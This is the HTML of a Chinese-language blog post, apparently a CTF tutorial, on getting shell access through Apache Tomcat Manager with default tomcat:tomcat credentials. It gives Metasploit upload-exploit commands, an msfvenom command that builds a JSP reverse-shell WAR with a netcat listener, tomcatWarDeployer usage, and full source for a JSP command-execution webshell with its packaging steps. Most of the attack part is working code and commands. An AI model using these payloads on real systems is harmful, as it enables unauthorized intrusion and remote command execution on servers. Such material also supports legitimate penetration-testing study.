@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="在玩CTF时，很多时候我发现Apache Tomcat在目标机器上运行，配置了默认登录，这可以帮助我们获得远程机器shell。因此我觉得，我应该编写所有可能的方法来利用tomcat manger应用程序获取远程机器的webshell。 0x01 流程 Tomcat Manager经过身份验证的上载代码执行 生成.war格式后门 Tomcat War Deployer Script 生成JSP We">
+<meta name="keywords" content="Hackthebox">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用Tomcat Manager的多种方法">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/23/2018-12-23-利用Tomcat Manager的多种方法/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="在玩CTF时，很多时候我发现Apache Tomcat在目标机器上运行，配置了默认登录，这可以帮助我们获得远程机器shell。因此我觉得，我应该编写所有可能的方法来利用tomcat manger应用程序获取远程机器的webshell。 0x01 流程 Tomcat Manager经过身份验证的上载代码执行 生成.war格式后门 Tomcat War Deployer Script 生成JSP We">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i1.wp.com/3.bp.blogspot.com/-ml43P-L_v4w/XBUvOsbQSpI/AAAAAAAAbvc/jA7Q5pIAG9AsDfdsA3DS4dLs_wSuLs_VgCLcBGAs/s1600/1.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-RM_zG0QelS0/XBUvQKbQipI/AAAAAAAAbvs/VhghCRlap64mTDjPOBY6YoTPbvXwkX4NgCLcBGAs/s1600/2.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-2GppiHBsVY8/XBUvQXzjPGI/AAAAAAAAbv0/06VAOYSRFkk3G0M4fQTabSxyYN3Q1dBuQCLcBGAs/s1600/3.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/1.bp.blogspot.com/-4O9R4wjjoB4/XBUvQVNdLQI/AAAAAAAAbvw/TfvX7VlF_C4caJVehuBBi66gwO47DjoLACLcBGAs/s1600/4.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/3.bp.blogspot.com/-9ylL7iOhRTw/XBUvQlk5jSI/AAAAAAAAbv4/poIBBGcmtIcptLomyNTyNJefyJlPfuJMQCLcBGAs/s1600/5.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-PqRVdSCmBj0/XBUvRZVgiWI/AAAAAAAAbv8/kOyp19wpH4wONm4QgjsZ8vageLgAXUKIgCLcBGAs/s1600/6.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/2.bp.blogspot.com/-03aPEVm_yYQ/XBUvRvcr0QI/AAAAAAAAbwA/PvZl1QqsR28JJy1Q0W9PPmqpskU4EZQ8gCLcBGAs/s1600/7.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/1.bp.blogspot.com/-BRXsz5-2X2E/XBUvR9YiQUI/AAAAAAAAbwE/bSjKDxAMqWkW42vIiTMrjwOLYWeaR3M0ACLcBGAs/s1600/8.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-wykeYXUswl8/XBUvSZeSwCI/AAAAAAAAbwI/h7fwe1kZ-Tw_VUSEPnYc9iJLvhrA6nIxwCLcBGAs/s1600/9.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/3.bp.blogspot.com/-EhkeycNHXYM/XBUvOjdjQqI/AAAAAAAAbvg/lFAMSg6cR7EEvLYzx8188-_W7vR5HV0bACLcBGAs/s1600/11.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/2.bp.blogspot.com/-YVJErrwk7k0/XBUvOwpwqDI/AAAAAAAAbvk/V6b_8cFiz9QcAM_u7Z5ydGY_22G8IWaOQCLcBGAs/s1600/12.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/4.bp.blogspot.com/-Z7ucBVLbZlc/XBUvPUh4lRI/AAAAAAAAbvo/JIiMVd1hDaou8AvJGFhbVDp50aQR3t0lwCLcBGAs/s1600/13.png?w=687&ssl=1">
+<meta property="og:image" content="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x06.jpg">
+<meta property="og:image" content="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x07.jpg">
+<meta property="og:image" content="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x08.jpg">
+<meta property="og:image" content="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x09.jpg">
+<meta property="og:image" content="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x10.jpg">
+<meta property="og:image" content="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x11.jpg">
+<meta property="og:image" content="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x12.jpg">
+<meta property="og:image" content="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x13.jpg">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/26972994-af8d-4cb3-afdb-102b31656719.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/86bf5b30-e8e6-4485-97f2-d47963a571b7.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/5027bcec-6b1b-4cc8-8d67-806c51a2dc71.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/c2bb5fc6-45cb-4774-9a0c-25fbf17f61c6.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/0f4a6dad-7363-4bbe-ae76-5ba4cc573d8d.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/955cf8bf-b559-4627-bae7-2e9fb41aded8.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/f6ea75c6-60ad-4f42-a1f5-ee7c90c4df33.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/83f2866f-161c-4e62-bd20-8c8369c5fad9.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/1745ca74-428a-4b09-9233-85faaed1de87.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/01c719e9-fa1f-4ce6-b3da-68f0a9d3ac2b.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/e68684dc-53a6-4d13-b0ba-9e5690e95a4c.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/44367a84-4a04-4e23-9863-b444b679c1fc.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/baa97b4d-70fb-4c19-9cb5-d8b5709a6505.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/29c3a323-0938-4a86-8264-51635ee491d5.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/dc354bdf-9f2b-46c9-b962-a9f610475e99.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/e3c6580c-7754-4228-b3fd-0af9bc184e32.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/dc52a5b4-e969-4ef5-b44a-016206cd2e77.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/45fbcc41-db75-4f26-b04f-00853ae7c685.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/92a8f30b-6e18-4b45-be6c-3aba3f2ca733.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/8e30c16d-793f-434e-979a-05352a2a60f0.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/5168cf39-b6c2-4f5b-89ea-4d3a2df2c196.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/ff96b625-8c2c-47cb-b628-c42d5bcf3b88.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/b2183a3f-4713-4fdc-a49a-a2b8bfa5f592.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/dc1973dc-889e-4123-8e64-f95a29e291f1.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/aadd158a-6495-426e-ab2c-55dc0b469c1d.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/fe05886e-684c-47d4-85d6-98eb561c5abe.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/ac332dd3-f17c-46ce-917f-89b4a2f66c95.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/19a4be4d-298d-4b02-b5d0-7b9fbbbc3d5e.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/0d6bf6c4-30e4-491c-9f88-90423a162337.png-w331s">
+<meta property="og:image" content="https://images.seebug.org/content/images/2017/09/aa9f0b6d-80ef-4831-9d5e-7b2738948467.png-w331s">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.300Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用Tomcat Manager的多种方法">
+<meta name="twitter:description" content="在玩CTF时，很多时候我发现Apache Tomcat在目标机器上运行，配置了默认登录，这可以帮助我们获得远程机器shell。因此我觉得，我应该编写所有可能的方法来利用tomcat manger应用程序获取远程机器的webshell。 0x01 流程 Tomcat Manager经过身份验证的上载代码执行 生成.war格式后门 Tomcat War Deployer Script 生成JSP We">
+<meta name="twitter:image" content="https://i1.wp.com/3.bp.blogspot.com/-ml43P-L_v4w/XBUvOsbQSpI/AAAAAAAAbvc/jA7Q5pIAG9AsDfdsA3DS4dLs_wSuLs_VgCLcBGAs/s1600/1.png?w=687&ssl=1">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/23/2018-12-23-利用Tomcat Manager的多种方法/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>利用Tomcat Manager的多种方法 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/23/2018-12-23-利用Tomcat Manager的多种方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">利用Tomcat Manager的多种方法
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-23 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-23T00:00:00+08:00">2018-12-23</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">9.8k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">9 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p>在玩CTF时，很多时候我发现Apache Tomcat在目标机器上运行，配置了默认登录，这可以帮助我们获得远程机器shell。因此我觉得，我应该编写所有可能的方法来利用tomcat manger应用程序获取远程机器的webshell。</p>
+<h1 id="0x01-流程"><a href="#0x01-流程" class="headerlink" title="0x01 流程"></a>0x01 流程</h1><ul>
+<li>Tomcat Manager经过身份验证的上载代码执行</li>
+<li>生成.war格式后门</li>
+<li>Tomcat War Deployer Script</li>
+<li>生成JSP Webshell</li>
+</ul>
+<p>让我们从nmap扫描开始，到tomcat服务检查端口8080作为tomcat。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p8080 192.168.1.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i1.wp.com/3.bp.blogspot.com/-ml43P-L_v4w/XBUvOsbQSpI/AAAAAAAAbvc/jA7Q5pIAG9AsDfdsA3DS4dLs_wSuLs_VgCLcBGAs/s1600/1.png?w=687&ssl=1" alt="img"></p>
+<p>从nmap输出结果，我们发现Apache Tomcat的端口8080是开放的。因此，我们导航到Web浏览器并探索目标IP：端口我们看到HTTP身份验证页面登录tomcat manger应用程序。</p>
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-RM_zG0QelS0/XBUvQKbQipI/AAAAAAAAbvs/VhghCRlap64mTDjPOBY6YoTPbvXwkX4NgCLcBGAs/s1600/2.png?w=687&ssl=1" alt="img"></p>
+<h2 id="1-Tomcat-Manager经过身份验证的上载代码执行"><a href="#1-Tomcat-Manager经过身份验证的上载代码执行" class="headerlink" title="1.Tomcat Manager经过身份验证的上载代码执行"></a>1.Tomcat Manager经过身份验证的上载代码执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/tomcat_mgr_upload</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 192.168.1.101</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set httpusername tomcat</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword tomcat</span><br><span class="line">msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>此模块可用于在具有公开“管理器”应用程序的Apache Tomcat服务器上执行有效负载。有效负载作为WAR存档上载，包含使用针对/ manager / html / upload组件的POST请求的jsp应用程序。注意：兼容的有效负载集根据所选目标而有所不同。例如，您必须选择Windows目标才能使用本机Windows有效负载。</p>
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-2GppiHBsVY8/XBUvQXzjPGI/AAAAAAAAbv0/06VAOYSRFkk3G0M4fQTabSxyYN3Q1dBuQCLcBGAs/s1600/3.png?w=687&ssl=1" alt="img"></p>
+<p>结果你可以观察到，我们有目标机器的meterpreter会话。</p>
+<h2 id="2-生成-war格式后门"><a href="#2-生成-war格式后门" class="headerlink" title="2.生成.war格式后门"></a>2.生成.war格式后门</h2><p><img src="https://i0.wp.com/1.bp.blogspot.com/-4O9R4wjjoB4/XBUvQVNdLQI/AAAAAAAAbvw/TfvX7VlF_C4caJVehuBBi66gwO47DjoLACLcBGAs/s1600/4.png?w=687&ssl=1" alt="img"></p>
+<p>我们可以使用msfvenom为java / jsp有效负载生成.war格式后门，您只需按照下面给出的语法创建.war格式文件然后运行netcat listener。</p>
+<p><strong>语法：</strong> msfvenom -p [payload] LHOST = [Kali Linux IP] LPORT = [1234] -f [文件格式]&gt; [文件名]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=1234 -f war &gt; shell.war</span><br><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i2.wp.com/3.bp.blogspot.com/-9ylL7iOhRTw/XBUvQlk5jSI/AAAAAAAAbv4/poIBBGcmtIcptLomyNTyNJefyJlPfuJMQCLcBGAs/s1600/5.png?w=687&ssl=1" alt="img"></p>
+<p>现在使用<strong>tomcat：tomcat</strong>作为用户名：密码登录tomcat manager应用程序。管理员仪表板将欢迎您上传.war文件。</p>
+<p>正如您所看到的那样，浏览器中的恶意shell.war文件将在图像中突出显示。只要您上传文件，就会在应用程序表中看到文件的/ path条目</p>
+<p>要执行.war文件，必须单击Application表中提到的/.war文件路径。或者您可以直接浏览<em>http：// target_IP：port / file_name</em>。</p>
+<p>一旦执行文件，您将通过netcat获得反向连接。</p>
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-PqRVdSCmBj0/XBUvRZVgiWI/AAAAAAAAbv8/kOyp19wpH4wONm4QgjsZ8vageLgAXUKIgCLcBGAs/s1600/6.png?w=687&ssl=1" alt="img"></p>
+<p>Booom！我们再一次访问远程webshell。</p>
+<p><img src="https://i2.wp.com/2.bp.blogspot.com/-03aPEVm_yYQ/XBUvRvcr0QI/AAAAAAAAbwA/PvZl1QqsR28JJy1Q0W9PPmqpskU4EZQ8gCLcBGAs/s1600/7.png?w=687&ssl=1" alt="img"></p>
+<h2 id="3-Tomcat-War-Deployer-Script"><a href="#3-Tomcat-War-Deployer-Script" class="headerlink" title="3.Tomcat War Deployer Script"></a>3.Tomcat War Deployer Script</h2><p>这是一个渗透测试工具，旨在利用Apache Tomcat凭证自动生成和部署JSP后门，以及之后调用它并提供漂亮的shell（通过web gui，绑定在远程机器上的侦听端口或作为反向tcp有效负载）连接到对手）。</p>
+<p>实际上，它会动态生成JSP后门WAR包，并使用pentester提供的有效HTTP身份验证凭据（或者自定义的凭证，最终我们都喜欢tomcat：tomcat）将其部署在Apache Tomcat Manager应用程序中。</p>
+<p><em>您可以从这里下载：https：//github.com/mgeeky/tomcatWarDeployer</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mgeeky/tomcatWarDeployer</span><br><span class="line">cd tomcatWarDeployer</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i2.wp.com/1.bp.blogspot.com/-BRXsz5-2X2E/XBUvR9YiQUI/AAAAAAAAbwE/bSjKDxAMqWkW42vIiTMrjwOLYWeaR3M0ACLcBGAs/s1600/8.png?w=687&ssl=1" alt="img"></p>
+<p>现在按照语法来利用目标机器，而无需手动上传.war文件。</p>
+<p><strong>语法：</strong> ./ tomcatWarDeployer.py -U [usrename] -p [password] -H [Kali Linux IP] -p [监听端口] [target_IP]：[tomcat_port]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tomcatWarDeployer.py -U tomcat -P tomcat -H 192.168.1.108 -p 4567 192.168.1.101:8080</span><br></pre></td></tr></table></figure>
+
+<p>在执行上面的命令时，我直接获得了webshell，你可以在下面给出的图像中观察它。</p>
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-wykeYXUswl8/XBUvSZeSwCI/AAAAAAAAbwI/h7fwe1kZ-Tw_VUSEPnYc9iJLvhrA6nIxwCLcBGAs/s1600/9.png?w=687&ssl=1" alt="img"></p>
+<h2 id="4-生成JSP-Webshell"><a href="#4-生成JSP-Webshell" class="headerlink" title="4.生成JSP Webshell"></a>4.生成JSP Webshell</h2><p>在本部分中，我们将了解如何生成和部署Webshell以在Tomcat manger应用程序上执行命令。</p>
+<p>首先，我们需要编写Webshell并将其打包为.war文件格式。要编写jsp Webshell，我们使用以下代码，我在此链接中找到了这些代码：<em>https*：</em>//pentesterlab.com/exercises/cve-2007-1860/course*</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;span style=&quot;color: #000000;&quot;&gt;&lt;FORM METHOD=GET ACTION=&apos;index.jsp&apos;&gt;</span><br><span class="line">&lt;INPUT name=&apos;cmd&apos; type=text&gt;</span><br><span class="line">&lt;INPUT type=submit value=&apos;Run&apos;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">   String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">   String output = &quot;&quot;;</span><br><span class="line">   if(cmd != null) &#123;</span><br><span class="line">      String s = null;</span><br><span class="line">      try &#123;</span><br><span class="line">         Process p = Runtime.getRuntime().exec(cmd,null,null);</span><br><span class="line">         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line">         while((s = sI.readLine()) != null) &#123; output += s+&quot;&lt;/br&gt;&quot;; &#125;</span><br><span class="line">      &#125;  catch(IOException e) &#123;   e.printStackTrace();   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将代码保存为index.jsp，然后执行以下命令将其打包为.war文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir webshell</span><br><span class="line">cp index.jsp webshell/</span><br><span class="line">cd webshell</span><br><span class="line">jar -cvf ../webshell.war *</span><br></pre></td></tr></table></figure>
+
+<p>在上面的命令的帮助下，您将获得一个war文件，您可以在tomcat manger应用程序中部署该文件。</p>
+<p><img src="https://i2.wp.com/3.bp.blogspot.com/-EhkeycNHXYM/XBUvOjdjQqI/AAAAAAAAbvg/lFAMSg6cR7EEvLYzx8188-_W7vR5HV0bACLcBGAs/s1600/11.png?w=687&ssl=1" alt="img"></p>
+<p>从下面给出的图像中可以看出，我已经部署了成功上传的webshell.war文件，现在让我们点击这个文件来执行它。</p>
+<p><img src="https://i2.wp.com/2.bp.blogspot.com/-YVJErrwk7k0/XBUvOwpwqDI/AAAAAAAAbvk/V6b_8cFiz9QcAM_u7Z5ydGY_22G8IWaOQCLcBGAs/s1600/12.png?w=687&ssl=1" alt="img"></p>
+<p>在执行/ webshell时，您将收到HTTP 404错误，现在执行index.jsp文件，如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106:8080/webshell/index.jsp</span><br></pre></td></tr></table></figure>
+
+<p>在执行上面的URL时，您将获得命令执行表单，现在明智地使用它来cmd命令。</p>
+<p><img src="https://i0.wp.com/4.bp.blogspot.com/-Z7ucBVLbZlc/XBUvPUh4lRI/AAAAAAAAbvo/JIiMVd1hDaou8AvJGFhbVDp50aQR3t0lwCLcBGAs/s1600/13.png?w=687&ssl=1" alt="img"></p>
+<p>希望！您很享受本文如何使用CVE-2007-1860访问Tomcat管理器</p>
